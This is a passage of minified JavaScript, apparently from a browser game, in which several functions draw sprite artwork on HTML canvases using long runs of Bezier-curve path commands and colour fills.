      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 126, e * 193);
      n.bezierCurveTo(e * 173, e * 94, e * 209, e * 100, e * 228, e * 57);
      n.bezierCurveTo(e * 190, e * 112, e * 165, e * 115, e * 127, e * 184);
      n.closePath();
      ye(n, undefined, t[1], e * 4);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 230, e * 57);
      n.bezierCurveTo(e * 266, e * 117, e * 310, e * 130, e * 332, e * 183);
      n.bezierCurveTo(e * 290, e * 112, e * 262, e * 109, e * 230, e * 56);
      n.closePath();
      ye(n, undefined, t[1], e * 4);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 154, e * 212);
      n.bezierCurveTo(e * 208, e * 224, e * 252, e * 219, e * 305, e * 212);
      n.bezierCurveTo(e * 267, e * 219, e * 204, e * 222, e * 155, e * 212);
      n.closePath();
      ye(n, undefined, t[1], e * 4);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 239, e * 59);
      n.bezierCurveTo(e * 302, e * 72, e * 325, e * 84, e * 326, e * 115);
      n.bezierCurveTo(e * 289, e * 80, e * 270, e * 88, e * 253, e * 78);
      n.closePath();
      ye(n, t[2]);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 216, e * 61);
      n.bezierCurveTo(e * 209, e * 70, e * 209, e * 70, e * 202, e * 79);
      n.bezierCurveTo(e * 173, e * 87, e * 162, e * 91, e * 137, e * 107);
      n.bezierCurveTo(e * 153, e * 78, e * 174, e * 67, e * 212, e * 62);
      n.closePath();
      ye(n, t[2]);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 175, e * 125);
      n.bezierCurveTo(e * 218, e * 94, e * 238, e * 90, e * 281, e * 125);
      n.bezierCurveTo(e * 245, e * 89, e * 240, e * 80, e * 228, e * 67);
      n.bezierCurveTo(e * 207, e * 100, e * 192, e * 104, e * 177, e * 123);
      n.closePath();
      ye(n, t[2]);
      return r;
    }
    function rn(e, i, t) {
      var r = document.createElement("canvas");
      var n = r.getContext("2d");
      r.width = e * 465;
      r.height = e * 405;
      n.globalAlpha = 1;
      n.translate(e * 6, e * 0);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 39.000030517578125, e * 162.03977966308594);
      n.bezierCurveTo(e * 125.00003051757812, e * 84.03977966308594, e * 108.50003051757812, e * 115.03977966308594, e * 178.00003051757812, e * 68.03977966308594);
      n.bezierCurveTo(e * 299.0000305175781, e * 146.53977966308594, e * 299.0000305175781, e * 146.53977966308594, e * 420.0000305175781, e * 225.03977966308594);
      n.bezierCurveTo(e * 400.0000305175781, e * 288.53977966308594, e * 400.0000305175781, e * 288.53977966308594, e * 380.0000305175781, e * 352.03977966308594);
      n.bezierCurveTo(e * 216.50003051757812, e * 345.53977966308594, e * 216.50003051757812, e * 345.53977966308594, e * 53.000030517578125, e * 339.03977966308594);
      n.closePath();
      ye(n, t[3]);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 23.000030517578125, e * 306.94886779785156);
      n.bezierCurveTo(e * 5.000030517578125, e * 275.94886779785156, e * 6.000030517578125, e * 201.94886779785156, e * 14.000030517578125, e * 150.94886779785156);
      n.bezierCurveTo(e * 40.000030517578125, e * 34.94886779785156, e * 157.00003051757812, e * 14.948867797851562, e * 199.00003051757812, e * 11.948867797851562);
      n.bezierCurveTo(e * 331.0000305175781, e * 0.9488677978515625, e * 409.0000305175781, e * 61.94886779785156, e * 428.0000305175781, e * 133.94886779785156);
      n.bezierCurveTo(e * 445.0000305175781, e * 207.94886779785156, e * 439.0000305175781, e * 274.94886779785156, e * 426.0000305175781, e * 342.94886779785156);
      n.bezierCurveTo(e * 355.0000305175781, e * 207.94886779785156, e * 345.0000305175781, e * 208.94886779785156, e * 333.0000305175781, e * 202.94886779785156);
      n.bezierCurveTo(e * 262.0000305175781, e * 143.94886779785156, e * 236.00003051757812, e * 148.94886779785156, e * 189.00003051757812, e * 162.94886779785156);
      n.bezierCurveTo(e * 82.00003051757812, e * 190.94886779785156, e * 78.00003051757812, e * 235.94886779785156, e * 62.000030517578125, e * 279.94886779785156);
      n.closePath();
      ye(n, t[0], t[1], e * 20);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 17.000030517578125, e * 149.94886779785156);
      n.bezierCurveTo(e * 76.00003051757812, e * 67.94886779785156, e * 177.00003051757812, e * 40.94886779785156, e * 232.00003051757812, e * 45.94886779785156);
      n.bezierCurveTo(e * 316.0000305175781, e * 46.94886779785156, e * 359.0000305175781, e * 74.94886779785156, e * 428.0000305175781, e * 145.94886779785156);
      n.bezierCurveTo(e * 414.0000305175781, e * 73.94886779785156, e * 386.0000305175781, e * 68.94886779785156, e * 359.0000305175781, e * 43.94886779785156);
      n.bezierCurveTo(e * 295.0000305175781, e * 5.9488677978515625, e * 239.00003051757812, e * 10.948867797851562, e * 207.00003051757812, e * 10.948867797851562);
      n.bezierCurveTo(e * 121.00003051757812, e * 20.948867797851562, e * 104.00003051757812, e * 34.94886779785156, e * 45.000030517578125, e * 84.94886779785156);
      n.bezierCurveTo(e * 14.000030517578125, e * 128.94886779785156, e * 18.000030517578125, e * 142.94886779785156, e * 16.000030517578125, e * 151.94886779785156);
      n.closePath();
      ye(n, t[2]);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 23.000030517578125, e * 306.94886779785156);
      n.bezierCurveTo(e * 5.000030517578125, e * 275.94886779785156, e * 6.000030517578125, e * 201.94886779785156, e * 14.000030517578125, e * 150.94886779785156);
      n.bezierCurveTo(e * 40.000030517578125, e * 34.94886779785156, e * 157.00003051757812, e * 14.948867797851562, e * 199.00003051757812, e * 11.948867797851562);
      n.bezierCurveTo(e * 331.0000305175781, e * 0.9488677978515625, e * 409.0000305175781, e * 61.94886779785156, e * 428.0000305175781, e * 133.94886779785156);
      n.bezierCurveTo(e * 445.0000305175781, e * 207.94886779785156, e * 439.0000305175781, e * 274.94886779785156, e * 426.0000305175781, e * 342.94886779785156);
      n.bezierCurveTo(e * 355.0000305175781, e * 207.94886779785156, e * 345.0000305175781, e * 208.94886779785156, e * 333.0000305175781, e * 202.94886779785156);
      n.bezierCurveTo(e * 262.0000305175781, e * 143.94886779785156, e * 236.00003051757812, e * 148.94886779785156, e * 189.00003051757812, e * 162.94886779785156);
      n.bezierCurveTo(e * 82.00003051757812, e * 190.94886779785156, e * 78.00003051757812, e * 235.94886779785156, e * 62.000030517578125, e * 279.94886779785156);
      n.closePath();
      ye(n, undefined, t[1], e * 16);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 60.000030517578125, e * 288.03977966308594);
      n.bezierCurveTo(e * 183.00003051757812, e * 320.03977966308594, e * 342.0000305175781, e * 306.03977966308594, e * 399.0000305175781, e * 286.03977966308594);
      n.bezierCurveTo(e * 420.0000305175781, e * 345.03977966308594, e * 410.0000305175781, e * 335.03977966308594, e * 415.0000305175781, e * 362.03977966308594);
      n.bezierCurveTo(e * 351.0000305175781, e * 384.03977966308594, e * 299.0000305175781, e * 389.03977966308594, e * 215.00003051757812, e * 391.03977966308594);
      n.bezierCurveTo(e * 128.00003051757812, e * 388.03977966308594, e * 69.00003051757812, e * 373.03977966308594, e * 39.000030517578125, e * 359.03977966308594);
      n.closePath();
      ye(n, t[0], t[1], e * 13);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 47.000030517578125, e * 327.03977966308594);
      n.bezierCurveTo(e * 203.00003051757812, e * 377.03977966308594, e * 331.0000305175781, e * 349.03977966308594, e * 410.0000305175781, e * 330.03977966308594);
      n.closePath();
      ye(n, t[0], t[1], e * 20);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 9.000030517578125, e * 339.1306915283203);
      n.bezierCurveTo(e * 2.000030517578125, e * 280.1306915283203, e * 30.000030517578125, e * 219.1306915283203, e * 85.00003051757812, e * 167.1306915283203);
      n.bezierCurveTo(e * 174.00003051757812, e * 82.13069152832031, e * 241.00003051757812, e * 101.13069152832031, e * 284.0000305175781, e * 115.13069152832031);
      n.bezierCurveTo(e * 333.0000305175781, e * 134.1306915283203, e * 376.0000305175781, e * 177.1306915283203, e * 410.0000305175781, e * 247.1306915283203);
      n.bezierCurveTo(e * 439.0000305175781, e * 300.1306915283203, e * 442.0000305175781, e * 346.1306915283203, e * 430.0000305175781, e * 363.1306915283203);
      n.bezierCurveTo(e * 418.0000305175781, e * 366.1306915283203, e * 395.0000305175781, e * 295.1306915283203, e * 355.0000305175781, e * 223.1306915283203);
      n.bezierCurveTo(e * 299.0000305175781, e * 156.1306915283203, e * 262.0000305175781, e * 155.1306915283203, e * 215.00003051757812, e * 159.1306915283203);
      n.bezierCurveTo(e * 133.00003051757812, e * 171.1306915283203, e * 120.00003051757812, e * 193.1306915283203, e * 96.00003051757812, e * 221.1306915283203);
      n.bezierCurveTo(e * 49.000030517578125, e * 262.1306915283203, e * 47.000030517578125, e * 306.1306915283203, e * 38.000030517578125, e * 336.1306915283203);
      n.bezierCurveTo(e * 30.000030517578125, e * 349.1306915283203, e * 30.000030517578125, e * 349.1306915283203, e * 22.000030517578125, e * 362.1306915283203);
      n.closePath();
      ye(n, t[2], t[1], e * 20);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 228.00003051757812, e * 128.03977966308594);
      n.bezierCurveTo(e * 315.0000305175781, e * 131.03977966308594, e * 349.0000305175781, e * 178.03977966308594, e * 386.0000305175781, e * 234.03977966308594);
      n.bezierCurveTo(e * 444.0000305175781, e * 329.03977966308594, e * 446.0000305175781, e * 354.03977966308594, e * 427.0000305175781, e * 373.03977966308594);
      n.bezierCurveTo(e * 389.0000305175781, e * 389.03977966308594, e * 399.0000305175781, e * 329.03977966308594, e * 361.0000305175781, e * 277.03977966308594);
      n.bezierCurveTo(e * 306.0000305175781, e * 191.03977966308594, e * 266.0000305175781, e * 183.03977966308594, e * 220.00003051757812, e * 181.03977966308594);
      n.bezierCurveTo(e * 138.00003051757812, e * 184.03977966308594, e * 123.00003051757812, e * 212.03977966308594, e * 89.00003051757812, e * 271.03977966308594);
      n.bezierCurveTo(e * 52.000030517578125, e * 349.03977966308594, e * 68.00003051757812, e * 364.03977966308594, e * 33.000030517578125, e * 369.03977966308594);
      n.bezierCurveTo(e * 6.000030517578125, e * 366.03977966308594, e * 5.000030517578125, e * 341.03977966308594, e * 26.000030517578125, e * 288.03977966308594);
      n.bezierCurveTo(e * 60.000030517578125, e * 207.03977966308594, e * 100.00003051757812, e * 180.03977966308594, e * 113.00003051757812, e * 170.03977966308594);
      n.bezierCurveTo(e * 159.00003051757812, e * 132.03977966308594, e * 196.00003051757812, e * 133.03977966308594, e * 226.00003051757812, e * 129.03977966308594);
      n.closePath();
      ye(n, t[0], t[1], e * 20);
      return r;
    }
    function nn(e, i, t, r) {
      var n = document.createElement("canvas");
      var a = n.getContext("2d");
      n.width = e * 198;
      n.height = e * 147;
      a.globalAlpha = i ? 0.5 : 1;
      a.translate(0, e * 6);
      a.beginPath();
      a.lineCap = "round";
      a.lineJoin = "round";
      a.moveTo(e * 44, e * 76);
      a.bezierCurveTo(e * 50, e * 82, e * 50, e * 82, e * 56, e * 88);
      a.bezierCurveTo(e * 59, e * 82, e * 59, e * 82, e * 62, e * 76);
      a.bezierCurveTo(e * 59, e * 71, e * 59, e * 71, e * 56, e * 66);
      a.bezierCurveTo(e * 59, e * 69, e * 59, e * 69, e * 62, e * 72);
      a.bezierCurveTo(e * 80, e * 48, e * 102, e * 50, e * 120, e * 62);
      a.bezierCurveTo(e * 127, e * 58, e * 127, e * 58, e * 134, e * 54);
      a.bezierCurveTo(e * 129, e * 60, e * 129, e * 60, e * 124, e * 66);
      a.bezierCurveTo(e * 129, e * 73, e * 129, e * 73, e * 134, e * 80);
      a.bezierCurveTo(e * 140, e * 74, e * 140, e * 74, e * 146, e * 68);
      a.bezierCurveTo(e * 142, e * 76, e * 142, e * 76, e * 138, e * 84);
      a.bezierCurveTo(e * 144, e * 90, e * 142, e * 90, e * 144, e * 90);
      a.bezierCurveTo(e * 136, e * 97, e * 136, e * 97, e * 128, e * 104);
      a.bezierCurveTo(e * 154, e * 110, e * 164, e * 90, e * 160, e * 80);
      a.bezierCurveTo(e * 138, e * 22, e * 148, e * 51, e * 136, e * 22);
      a.bezierCurveTo(e * 97, e * 24, e * 97, e * 24, e * 58, e * 26);
      a.bezierCurveTo(e * 47, e * 54, e * 36, e * 80, e * 36, e * 82);
      a.bezierCurveTo(e * 40, e * 108, e * 54, e * 104, e * 62, e * 104);
      a.bezierCurveTo(e * 46, e * 92, e * 54, e * 97, e * 46, e * 90);
      a.closePath();
      ye(a, t[0]);
      a.beginPath();
      a.lineCap = "round";
      a.lineJoin = "round";
      a.moveTo(e * 36, e * 80);
      a.bezierCurveTo(e * 30, e * 84, e * 28, e * 92, e * 34, e * 100);
      a.bezierCurveTo(e * 41.5, e * 102, e * 41.5, e * 102, e * 49, e * 104);
      a.bezierCurveTo(e * 43, e * 105.5, e * 43, e * 105.5, e * 37, e * 107);
      a.bezierCurveTo(e * 46, e * 111, e * 60, e * 114, e * 76, e * 114);
      a.bezierCurveTo(e * 78, e * 110.5, e * 78, e * 110.5, e * 80, e * 107);
      a.bezierCurveTo(e * 81, e * 110.5, e * 81, e * 110.5, e * 82, e * 114);
      a.bezierCurveTo(e * 94.5, e * 113.5, e * 94.5, e * 113.5, e * 107, e * 113);
      a.bezierCurveTo(e * 108.5, e * 110, e * 108.5, e * 110, e * 110, e * 107);
      a.bezierCurveTo(e * 111.5, e * 110.5, e * 111.5, e * 110.5, e * 113, e * 114);
      a.bezierCurveTo(e * 131, e * 112.5, e * 131, e * 112.5, e * 149, e * 111);
      a.bezierCurveTo(e * 148.5, e * 107.5, e * 148.5, e * 107.5, e * 148, e * 104);
      a.bezierCurveTo(e * 150.5, e * 107, e * 150.5, e * 107, e * 153, e * 110);
      a.bezierCurveTo(e * 155.5, e * 108.5, e * 155.5, e * 108.5, e * 158, e * 107);
      a.bezierCurveTo(e * 156.5, e * 104, e * 156.5, e * 104, e * 155, e * 101);
      a.bezierCurveTo(e * 158.5, e * 102.5, e * 158.5, e * 102.5, e * 162, e * 104);
      a.bezierCurveTo(e * 168, e * 100, e * 170, e * 92, e * 169, e * 85);
      a.bezierCurveTo(e * 166, e * 86, e * 166, e * 86, e * 163, e * 87);
      a.bezierCurveTo(e * 165.5, e * 83, e * 165.5, e * 83, e * 168, e * 79);
      a.bezierCurveTo(e * 165.5, e * 76.5, e * 165.5, e * 76.5, e * 163, e * 74);
      a.bezierCurveTo(e * 155, e * 82.5, e * 155, e * 82.5, e * 147, e * 91);
      a.bezierCurveTo(e * 139, e * 95.5, e * 139, e * 95.5, e * 131, e * 100);
      a.bezierCurveTo(e * 97.5, e * 100.5, e * 97.5, e * 100.5, e * 64, e * 101);
      a.bezierCurveTo(e * 49, e * 102, e * 43, e * 90, e * 36, e * 80);
      a.closePath();
      ye(a, t[0]);
      a.globalAlpha = 1;
      a.translate(0, e * -6);
      a.beginPath();
      a.lineCap = "round";
      a.lineJoin = "round";
      a.moveTo(e * 36, e * 80);
      a.bezierCurveTo(e * 30, e * 84, e * 28, e * 92, e * 34, e * 100);
      a.bezierCurveTo(e * 41.5, e * 102, e * 41.5, e * 102, e * 49, e * 104);
      a.bezierCurveTo(e * 43, e * 105.5, e * 43, e * 105.5, e * 37, e * 107);
      a.bezierCurveTo(e * 46, e * 111, e * 60, e * 114, e * 76, e * 114);
      a.bezierCurveTo(e * 78, e * 110.5, e * 78, e * 110.5, e * 80, e * 107);
      a.bezierCurveTo(e * 81, e * 110.5, e * 81, e * 110.5, e * 82, e * 114);
      a.bezierCurveTo(e * 94.5, e * 113.5, e * 94.5, e * 113.5, e * 107, e * 113);
      a.bezierCurveTo(e * 108.5, e * 110, e * 108.5, e * 110, e * 110, e * 107);
      a.bezierCurveTo(e * 111.5, e * 110.5, e * 111.5, e * 110.5, e * 113, e * 114);
      a.bezierCurveTo(e * 131, e * 112.5, e * 131, e * 112.5, e * 149, e * 111);
      a.bezierCurveTo(e * 148.5, e * 107.5, e * 148.5, e * 107.5, e * 148, e * 104);
      a.bezierCurveTo(e * 150.5, e * 107, e * 150.5, e * 107, e * 153, e * 110);
      a.bezierCurveTo(e * 155.5, e * 108.5, e * 155.5, e * 108.5, e * 158, e * 107);
      a.bezierCurveTo(e * 156.5, e * 104, e * 156.5, e * 104, e * 155, e * 101);
      a.bezierCurveTo(e * 158.5, e * 102.5, e * 158.5, e * 102.5, e * 162, e * 104);
      a.bezierCurveTo(e * 168, e * 100, e * 170, e * 92, e * 169, e * 85);
      a.bezierCurveTo(e * 166, e * 86, e * 166, e * 86, e * 163, e * 87);
      a.bezierCurveTo(e * 165.5, e * 83, e * 165.5, e * 83, e * 168, e * 79);
      a.bezierCurveTo(e * 165.5, e * 76.5, e * 165.5, e * 76.5, e * 163, e * 74);
      a.bezierCurveTo(e * 155, e * 82.5, e * 155, e * 82.5, e * 147, e * 91);
      a.bezierCurveTo(e * 139, e * 95.5, e * 139, e * 95.5, e * 131, e * 100);
      a.bezierCurveTo(e * 97.5, e * 100.5, e * 97.5, e * 100.5, e * 64, e * 101);
      a.bezierCurveTo(e * 49, e * 102, e * 43, e * 90, e * 36, e * 80);
      a.closePath();
      ye(a, t[1], t[2], e * 4);
      a.beginPath();
      a.lineCap = "round";
      a.lineJoin = "round";
      a.moveTo(e * 49, e * 98);
      a.bezierCurveTo(e * 96.5, e * 98, e * 96.5, e * 98, e * 144, e * 98);
      a.bezierCurveTo(e * 136.5, e * 102, e * 136.5, e * 102, e * 129, e * 106);
      a.bezierCurveTo(e * 103, e * 105.5, e * 103, e * 105.5, e * 77, e * 105);
      a.bezierCurveTo(e * 65, e * 105, e * 65, e * 105, e * 53, e * 105);
      a.closePath();
      ye(a, t[1]);
      a.globalAlpha = 0.5;
      a.beginPath();
      a.lineCap = "round";
      a.lineJoin = "round";
      a.moveTo(e * 54, e * 98);
      a.bezierCurveTo(e * 97, e * 98, e * 97, e * 98, e * 140, e * 98);
      a.bezierCurveTo(e * 134, e * 101, e * 134, e * 101, e * 128, e * 104);
      a.bezierCurveTo(e * 92, e * 104, e * 92, e * 104, e * 56, e * 104);
      a.closePath();
      ye(a, t[0]);
      a.globalAlpha = 1;
      a.beginPath();
      a.lineCap = "round";
      a.lineJoin = "round";
      a.moveTo(e * 118, e * 47);
      a.bezierCurveTo(e * 124.5, e * 43.5, e * 124.5, e * 43.5, e * 131, e * 40);
      a.bezierCurveTo(e * 128, e * 46, e * 128, e * 46, e * 125, e * 52);
      a.bezierCurveTo(e * 131, e * 57, e * 135, e * 64, e * 139, e * 73);
      a.bezierCurveTo(e * 142.5, e * 69.5, e * 142.5, e * 69.5, e * 146, e * 66);
      a.bezierCurveTo(e * 143.5, e * 72.5, e * 143.5, e * 72.5, e * 141, e * 79);
      a.bezierCurveTo(e * 142, e * 91, e * 141, e * 94, e * 132, e * 98);
      a.bezierCurveTo(e * 117, e * 102, e * 126, e * 108, e * 142, e * 102);
      a.bezierCurveTo(e * 159, e * 98, e * 164, e * 80, e * 162, e * 47);
      a.bezierCurveTo(e * 160, e * 19, e * 150, e * 6, e * 117, e * 4);
      a.bezierCurveTo(e * 44, e * 0, e * 35, e * 20, e * 33, e * 37);
      a.bezierCurveTo(e * 29, e * 69, e * 33, e * 88, e * 44, e * 96);
      a.bezierCurveTo(e * 64, e * 107, e * 70, e * 102, e * 54, e * 93);
      a.bezierCurveTo(e * 49, e * 88, e * 50, e * 82, e * 53, e * 77);
      a.bezierCurveTo(e * 51.5, e * 71, e * 51.5, e * 71, e * 50, e * 65);
      a.bezierCurveTo(e * 53, e * 68.5, e * 53, e * 68.5, e * 56, e * 72);
      a.bezierCurveTo(e * 59, e * 67.5, e * 59, e * 67.5, e * 62, e * 63);
      a.bezierCurveTo(e * 60.5, e * 59.5, e * 60.5, e * 59.5, e * 59, e * 56);
      a.bezierCurveTo(e * 62, e * 57, e * 62, e * 57, e * 65, e * 58);
      a.bezierCurveTo(e * 78, e * 35, e * 103, e * 36, e * 117, e * 47);
      a.closePath();
      ye(a, t[1], t[2], e * 6);
      a.beginPath();
      a.lineCap = "round";
      a.lineJoin = "round";
      a.moveTo(e * 62, e * 21);
      a.bezierCurveTo(e * 63, e * 34, e * 64, e * 37, e * 66, e * 40);
      a.bezierCurveTo(e * 54, e * 49, e * 53, e * 51, e * 48, e * 58);
      a.bezierCurveTo(e * 44, e * 51, e * 42, e * 43, e * 40, e * 36);
      a.bezierCurveTo(e * 47, e * 28, e * 52, e * 25, e * 61, e * 21);
      a.closePath();
      ye(a, t[4]);
      a.beginPath();
      a.lineCap = "round";
      a.lineJoin = "round";
      a.moveTo(e * 60, e * 29);
      a.bezierCurveTo(e * 62, e * 25, e * 65, e * 24, e * 70, e * 23);
      ye(a, undefined, t[3], e * 4);
      a.beginPath();
      a.lineCap = "round";
      a.lineJoin = "round";
      a.moveTo(e * 61, e * 37);
      a.bezierCurveTo(e * 63, e * 32, e * 66, e * 32, e * 71, e * 32);
      ye(a, undefined, t[3], e * 4);
      a.beginPath();
      a.lineCap = "round";
      a.lineJoin = "round";
      a.moveTo(e * 52, e * 31);
      a.bezierCurveTo(e * 50, e * 26, e * 50, e * 25, e * 51, e * 23);
      ye(a, undefined, t[3], e * 4);
      a.beginPath();
      a.lineCap = "round";
      a.lineJoin = "round";
      a.moveTo(e * 46, e * 35);
      a.bezierCurveTo(e * 44, e * 31, e * 43, e * 29, e * 45, e * 26);
      ye(a, undefined, t[3], e * 4);
      a.beginPath();
      a.lineCap = "round";
      a.lineJoin = "round";
      a.moveTo(e * 58, e * 44);
      a.bezierCurveTo(e * 57, e * 48, e * 57, e * 50, e * 60, e * 52);
      ye(a, undefined, t[3], e * 4);
      a.beginPath();
      a.lineCap = "round";
      a.lineJoin = "round";
      a.moveTo(e * 53, e * 48);
      a.bezierCurveTo(e * 52, e * 52, e * 52, e * 54, e * 55, e * 57);
      ye(a, undefined, t[3], e * 4);
      a.beginPath();
      a.lineCap = "round";
      a.lineJoin = "round";
      a.moveTo(e * 46, e * 41);
      a.bezierCurveTo(e * 41, e * 42, e * 39, e * 45, e * 38, e * 48);
      ye(a, undefined, t[3], e * 4);
      a.beginPath();
      a.lineCap = "round";
      a.lineJoin = "round";
      a.moveTo(e * 48, e * 48);
      a.bezierCurveTo(e * 42, e * 51, e * 42, e * 53, e * 40, e * 55);
      ye(a, undefined, t[3], e * 4);
      if (r == 0) {
        a.beginPath();
        a.lineCap = "round";
        a.lineJoin = "round";
        a.moveTo(e * 99, e * 101);
        a.bezierCurveTo(e * 118.6666259765625, e * 104.33331298828125, e * 124.6666259765625, e * 116.33331298828125, e * 112.6666259765625, e * 114.33331298828125);
        a.bezierCurveTo(e * 104.6666259765625, e * 112.33331298828125, e * 100.6666259765625, e * 105.33331298828125, e * 99.6666259765625, e * 101.33331298828125);
        ye(a, undefined, t[5], e * 6);
        a.beginPath();
        a.lineCap = "round";
        a.lineJoin = "round";
        a.moveTo(e * 97.6666259765625, e * 101.33331298828125);
        a.bezierCurveTo(e * 81.6666259765625, e * 106.33331298828125, e * 79.6666259765625, e * 114.33331298828125, e * 89.6666259765625, e * 114.33331298828125);
        a.bezierCurveTo(e * 95.6666259765625, e * 111.33331298828125, e * 95.6666259765625, e * 109.33331298828125, e * 98.6666259765625, e * 102.33331298828125);
        ye(a, undefined, t[5], e * 6);
      } else {
        a.beginPath();
        a.lineCap = "round";
        a.lineJoin = "round";
        a.moveTo(e * 103, e * 100.39999389648438);
        a.bezierCurveTo(e * 120, e * 106.39999389648438, e * 118, e * 107.39999389648438, e * 120, e * 111.39999389648438);
        ye(a, undefined, t[5], e * 6);
        a.beginPath();
        a.lineCap = "round";
        a.lineJoin = "round";
        a.moveTo(e * 103, e * 100.39999389648438);
        a.bezierCurveTo(e * 90, e * 103.39999389648438, e * 89, e * 106.39999389648438, e * 87, e * 112.39999389648438);
        ye(a, undefined, t[5], e * 6);
        ze(a, e * 86, e * 114.39999389648438, e * 4.5);
        ye(a, t[1], t[5], e * 6);
        ze(a, e * 121, e * 114.39999389648438, e * 4.5);
        ye(a, t[1], t[5], e * 6);
      }
      return n;
    }
    function an(e, i) {
      var t = document.createElement("canvas");
      var r = t.getContext("2d");
      t.width = e * 253;
      t.height = e * 192;
      r.globalAlpha = 0.5;
      r.save();
      r.translate(e * 42, e * 99);
      r.globalAlpha = 0.5;
      Be(r, e * -7, e * -20, e * 14, e * 39, e * 20);
      r.restore();
      ye(r, i[0]);
      r.globalAlpha = 1;
      r.save();
      r.translate(e * 37, e * 94);
      Be(r, e * -7, e * -20, e * 14, e * 37, e * 20);
      r.restore();
      ye(r, i[2]);
      r.globalAlpha = 0.5;
      r.save();
      r.translate(e * 136, e * 99);
      r.globalAlpha = 0.5;
      Be(r, e * -84, e * -67, e * 168, e * 134, e * 20);
      r.restore();
      ye(r, i[0], i[0], e * 13);
      r.globalAlpha = 1;
      r.save();
      r.translate(e * 131, e * 94);
      Be(r, e * -84, e * -67, e * 168, e * 134, e * 20);
      r.restore();
      ye(r, i[2], i[2], e * 13);
      r.save();
      r.translate(e * 131, e * 94);
      Be(r, e * -76, e * -61, e * 152, e * 122, e * 20);
      r.restore();
      ye(r, i[3], i[1], e * 8);
      r.save();
      r.translate(e * 168.5, e * 93.5);
      Be(r, e * -30.5, e * -58.5, e * 61, e * 117, e * 20);
      r.restore();
      ye(r, i[3], i[4], e * 6);
      r.save();
      r.translate(e * 93.5, e * 95.5);
      Be(r, e * -32, e * -59.5, e * 59, e * 119, e * 20);
      r.restore();
      ye(r, i[3], i[4], e * 6);
      r.save();
      r.translate(e * 130.5, e * 94);
      Be(r, e * -36, e * -67, e * 73, e * 134, e * 20);
      r.restore();
      ye(r, i[3], i[2], e * 8);
      r.globalAlpha = 0.5;
      r.save();
      r.translate(e * 133, e * 97);
      Be(r, e * -83, e * -12, e * 160, e * 24, e * 0);
      r.restore();
      ye(r, i[0]);
      r.globalAlpha = 1;
      r.save();
      r.translate(e * 133, e * 92);
      Be(r, e * -83, e * -12, e * 160, e * 24, e * 0);
      r.restore();
      ye(r, i[2]);
      r.globalAlpha = 0.5;
      r.save();
      r.translate(e * 228, e * 99.5);
      r.globalAlpha = 0.5;
      Be(r, e * -5, e * -18.5, e * 10, e * 37, e * 20);
      r.restore();
      ye(r, i[0]);
      r.globalAlpha = 1;
      r.save();
      r.translate(e * 223, e * 94.5);
      Be(r, e * -5, e * -18.5, e * 10, e * 37, e * 20);
      r.restore();
      ye(r, i[2]);
      r.save();
      r.translate(e * 133.5, e * 175.5);
      r.globalAlpha = 0.5;
      Be(r, e * -22.5, e * -6.5, e * 45, e * 13, e * 20);
      r.restore();
      ye(r, i[0]);
      r.globalAlpha = 1;
      r.save();
      r.translate(e * 128.5, e * 170.5);
      Be(r, e * -22.5, e * -6.5, e * 45, e * 13, e * 20);
      r.restore();
      ye(r, i[2]);
      return t;
    }
    function on(e, i, t) {
      var r = document.createElement("canvas");
      var n = r.getContext("2d");
      r.width = e * 316;
      r.height = e * 365;
      n.save();
      n.translate(e * 156.07142639160156, e * 51.81248474121094);
      n.rotate(0);
      Be(n, e * -21.5, e * -34, e * 43, e * 68, e * 8);
      n.restore();
      ye(n, t[1], t[2], e * 15);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 110.57142639160156, e * 197.09820556640625);
      n.bezierCurveTo(e * 158.07142639160156, e * 179.09820556640625, e * 158.07142639160156, e * 179.09820556640625, e * 205.57142639160156, e * 161.09820556640625);
      n.bezierCurveTo(e * 205.57142639160156, e * 235.45535278320312, e * 205.57142639160156, e * 235.45535278320312, e * 205.57142639160156, e * 309.8125);
      n.bezierCurveTo(e * 205.57142639160156, e * 323.8125, e * 200.57142639160156, e * 325.8125, e * 187.57142639160156, e * 326.8125);
      n.bezierCurveTo(e * 155.57142639160156, e * 326.3125, e * 155.57142639160156, e * 326.3125, e * 123.57142639160156, e * 325.8125);
      n.bezierCurveTo(e * 111.57142639160156, e * 326.8125, e * 109.57142639160156, e * 321.8125, e * 110.57142639160156, e * 312.8125);
      n.closePath();
      ye(n, t[3], t[4], e * 15);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 126.57142639160156, e * 67.38392639160156);
      n.bezierCurveTo(e * 126.57142639160156, e * 57.38392639160156, e * 132.57142639160156, e * 54.38392639160156, e * 140.57142639160156, e * 54.38392639160156);
      n.bezierCurveTo(e * 177.57142639160156, e * 55.38392639160156, e * 158.07142639160156, e * 54.38392639160156, e * 175.57142639160156, e * 54.38392639160156);
      n.bezierCurveTo(e * 185.57142639160156, e * 56.38392639160156, e * 185.57142639160156, e * 57.38392639160156, e * 184.57142639160156, e * 66.38392639160156);
      n.bezierCurveTo(e * 184.57142639160156, e * 78.38392639160156, e * 184.57142639160156, e * 89.38392639160156, e * 184.57142639160156, e * 90.38392639160156);
      n.bezierCurveTo(e * 177.57142639160156, e * 107.38392639160156, e * 180.57142639160156, e * 112.38392639160156, e * 189.57142639160156, e * 116.38392639160156);
      n.bezierCurveTo(e * 212.57142639160156, e * 127.38392639160156, e * 212.57142639160156, e * 132.38392639160156, e * 211.57142639160156, e * 150.38392639160156);
